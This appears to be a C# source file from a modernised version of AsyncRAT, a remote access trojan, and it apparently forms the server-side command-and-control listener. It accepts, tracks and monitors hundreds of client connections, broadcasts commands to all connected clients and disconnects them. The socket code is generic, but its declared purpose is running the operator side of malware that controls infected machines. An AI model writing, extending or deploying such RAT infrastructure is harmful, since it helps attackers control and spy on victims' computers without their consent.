using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using Server.Helper;

namespace Server.Connection;

/// <summary>
/// Modern high-performance listener for AsyncRAT (.NET 9.0)
/// </summary>
public sealed class ModernListener : IAsyncDisposable
{
    private readonly IAsyncRATLogger _logger;
    private readonly CancellationTokenSource _cancellationTokenSource = new();
    private readonly ConcurrentDictionary<string, ModernClient> _clients = new();
    private readonly SemaphoreSlim _connectionSemaphore;
    
    private Socket? _serverSocket;
    private bool _disposed;

    public bool IsListening { get; private set; }
    public int ActiveConnections => _clients.Count;
    public int MaxConnections { get; }

    public ModernListener(IAsyncRATLogger logger, int maxConnections = 500)
    {
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
        MaxConnections = maxConnections;
        _connectionSemaphore = new SemaphoreSlim(maxConnections, maxConnections);
    }

    /// <summary>
    /// Starts listening for connections asynchronously
    /// </summary>
    public async Task<bool> StartAsync(int port, CancellationToken cancellationToken = default)
    {
        if (_disposed) return false;

        try
        {
            if (IsListening)
            {
                await _logger.WarningAsync($"Listener is already running on port {port}");
                return false;
            }

            var endpoint = new IPEndPoint(IPAddress.Any, port);
            _serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            
            // Configure socket options for optimal performance
            _serverSocket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            _serverSocket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
            _serverSocket.SetSocketOption(SocketOptionLevel.Tcp, SocketOptionName.NoDelay, true);
            
            _serverSocket.Bind(endpoint);
            _serverSocket.Listen(MaxConnections);
            
            IsListening = true;
            await _logger.InfoAsync($"Server listening on port {port} (max connections: {MaxConnections})");
            
            // Start accepting connections in background
            _ = Task.Run(() => AcceptConnectionsAsync(_cancellationTokenSource.Token), cancellationToken);
            
            // Start connection monitoring
            _ = Task.Run(() => MonitorConnectionsAsync(_cancellationTokenSource.Token), cancellationToken);
            
            return true;
        }
        catch (SocketException ex)
        {
            await _logger.ErrorAsync($"Socket error starting listener on port {port}: {ex.Message} (Error Code: {ex.ErrorCode})", ex);
            return false;
        }
        catch (Exception ex)
        {
            await _logger.CriticalAsync($"Unexpected error starting listener on port {port}", ex);
            return false;
        }
    }

    /// <summary>
    /// Stops the listener
    /// </summary>
    public async Task StopAsync()
    {
        if (_disposed || !IsListening) return;

        try
        {
            IsListening = false;
            _cancellationTokenSource.Cancel();
            
            // Close server socket
            _serverSocket?.Close();
            _serverSocket?.Dispose();
            _serverSocket = null;
            
            // Disconnect all clients
            await DisconnectAllClientsAsync();
            
            await _logger.InfoAsync("Server listener stopped");
        }
        catch (Exception ex)
        {
            await _logger.ErrorAsync("Error stopping server listener", ex);
        }
    }

    /// <summary>
    /// Gets all connected clients as an async enumerable
    /// </summary>
    public async IAsyncEnumerable<ModernClient> GetConnectedClientsAsync([EnumeratorCancellation] CancellationToken cancellationToken = default)
    {
        await foreach (var client in GetClientsAsync(cancellationToken))
        {
            if (client.IsConnected)
                yield return client;
        }
    }

    /// <summary>
    /// Gets client statistics
    /// </summary>
    public async Task<ConnectionStatistics> GetStatisticsAsync()
    {
        var connectedClients = 0;
        var totalBytesReceived = 0L;
        var totalBytesSent = 0L;

        await foreach (var client in GetConnectedClientsAsync())
        {
            connectedClients++;
            var stats = await client.GetStatisticsAsync();
            totalBytesReceived += stats.BytesReceived;
            totalBytesSent += stats.BytesSent;
        }

        return new ConnectionStatistics
        {
            ActiveConnections = connectedClients,
            MaxConnections = MaxConnections,
            TotalBytesReceived = totalBytesReceived,
            TotalBytesSent = totalBytesSent,
            IsListening = IsListening
        };
    }

    /// <summary>
    /// Broadcasts a message to all connected clients
    /// </summary>
    public async Task BroadcastAsync(ReadOnlyMemory<byte> message, CancellationToken cancellationToken = default)
    {
        var broadcastTasks = new List<Task>();

        await foreach (var client in GetConnectedClientsAsync(cancellationToken))
        {
            broadcastTasks.Add(client.SendAsync(message, cancellationToken));
        }

        await Task.WhenAll(broadcastTasks);
        await _logger.DebugAsync($"Broadcasted message to {broadcastTasks.Count} clients");
    }

    /// <summary>
    /// Disconnects a specific client
    /// </summary>
    public async Task<bool> DisconnectClientAsync(string clientId)
    {
        if (_clients.TryRemove(clientId, out var client))
        {
            await client.DisconnectAsync();
            await _logger.DebugAsync($"Disconnected client: {clientId}");
            return true;
        }

        return false;
    }

    private async Task AcceptConnectionsAsync(CancellationToken cancellationToken)
    {
        await _logger.DebugAsync("Started accepting connections");

        while (!cancellationToken.IsCancellationRequested && IsListening)
        {
            try
            {
                // Wait for connection slot
                await _connectionSemaphore.WaitAsync(cancellationToken);

                var clientSocket = await AcceptSocketAsync(cancellationToken);
                if (clientSocket is not null)
                {
                    // Handle client connection in background
                    _ = Task.Run(async () => await HandleClientConnectionAsync(clientSocket, cancellationToken), cancellationToken);
                }
                else
                {
                    _connectionSemaphore.Release();
                }
            }
            catch (OperationCanceledException)
            {
                break;
            }
            catch (Exception ex)
            {
                await _logger.ErrorAsync("Error accepting connections", ex);
                _connectionSemaphore.Release();
                
                // Brief delay before retrying
                await Task.Delay(1000, cancellationToken);
            }
        }

        await _logger.DebugAsync("Stopped accepting connections");
    }

    private async Task<Socket?> AcceptSocketAsync(CancellationToken cancellationToken)
    {
        if (_serverSocket is null || !IsListening) return null;

        try
        {
            // Use TaskCompletionSource for cancellation support
            var tcs = new TaskCompletionSource<Socket>();
            
            using var registration = cancellationToken.Register(() => tcs.TrySetCanceled());
            
            _serverSocket.BeginAccept(ar =>
            {
                try
                {
                    var socket = _serverSocket.EndAccept(ar);
                    tcs.TrySetResult(socket);
                }
                catch (Exception ex)
                {
                    tcs.TrySetException(ex);
                }
            }, null);

            return await tcs.Task;
        }
        catch (OperationCanceledException)
        {
            return null;
        }
        catch (ObjectDisposedException)
        {
            return null;
        }
        catch (Exception ex)
        {
            await _logger.WarningAsync($"Error accepting socket: {ex.Message}");
            return null;
        }
    }

    private async Task HandleClientConnectionAsync(Socket clientSocket, CancellationToken cancellationToken)
    {
        ModernClient? client = null;
        
        try
        {
            var clientEndpoint = clientSocket.RemoteEndPoint?.ToString() ?? "Unknown";
            var clientId = $"client_{Guid.NewGuid():N}";
            
            await _logger.InfoAsync($"New client connection from: {clientEndpoint} (ID: {clientId})");
            
            client = new ModernClient(clientId, clientSocket, _logger);
            _clients.TryAdd(clientId, client);
            
            // Initialize client connection
            await client.InitializeAsync(cancellationToken);
            
            // Handle client communication
            await client.HandleCommunicationAsync(cancellationToken);
        }
        catch (Exception ex)
        {
            await _logger.ErrorAsync("Error handling client connection", ex);
        }
        finally
        {
            // Cleanup
            if (client is not null)
            {
                _clients.TryRemove(client.Id, out _);
                await client.DisconnectAsync();
            }
            
            _connectionSemaphore.Release();
        }
    }

    private async Task MonitorConnectionsAsync(CancellationToken cancellationToken)
    {
        using var timer = new PeriodicTimer(TimeSpan.FromMinutes(1));
        
        while (!cancellationToken.IsCancellationRequested && IsListening)
        {
            try
            {
                await timer.WaitForNextTickAsync(cancellationToken);
                
                // Remove disconnected clients
                var disconnectedClients = new List<string>();
                
                foreach (var (id, client) in _clients)
                {
                    if (!client.IsConnected)
                    {
                        disconnectedClients.Add(id);
                    }
                }
                
                foreach (var clientId in disconnectedClients)
                {
                    if (_clients.TryRemove(clientId, out var client))
                    {
                        await client.DisconnectAsync();
                        await _logger.DebugAsync($"Removed disconnected client: {clientId}");
                    }
                }
                
                if (disconnectedClients.Count > 0)
                {
                    await _logger.DebugAsync($"Cleaned up {disconnectedClients.Count} disconnected clients");
                }
                
                // Log connection statistics
                var stats = await GetStatisticsAsync();
                await _logger.DebugAsync($"Active connections: {stats.ActiveConnections}/{stats.MaxConnections}");
            }
            catch (OperationCanceledException)
            {
                break;
            }
            catch (Exception ex)
            {
                await _logger.ErrorAsync("Error monitoring connections", ex);
            }
        }
    }

    private async Task DisconnectAllClientsAsync()
    {
        var disconnectTasks = new List<Task>();
        
        foreach (var (_, client) in _clients)
        {
            disconnectTasks.Add(client.DisconnectAsync());
        }
        
        await Task.WhenAll(disconnectTasks);
        _clients.Clear();
        
        await _logger.InfoAsync($"Disconnected all clients");
    }

    private async IAsyncEnumerable<ModernClient> GetClientsAsync([EnumeratorCancellation] CancellationToken cancellationToken = default)
    {
        foreach (var (_, client) in _clients)
        {
            cancellationToken.ThrowIfCancellationRequested();
            yield return client;
            await Task.Yield(); // Allow other operations to proceed
        }
    }

    public async ValueTask DisposeAsync()
    {
        if (_disposed) return;
        
        _disposed = true;
        
        await StopAsync();
        
        _cancellationTokenSource?.Dispose();
        _connectionSemaphore?.Dispose();
        
        await _logger.DebugAsync("ModernListener disposed");
    }
}

/// <summary>
/// Connection statistics record
/// </summary>
public sealed record ConnectionStatistics
{
    public int ActiveConnections { get; init; }
    public int MaxConnections { get; init; }
    public long TotalBytesReceived { get; init; }
    public long TotalBytesSent { get; init; }
    public bool IsListening { get; init; }
}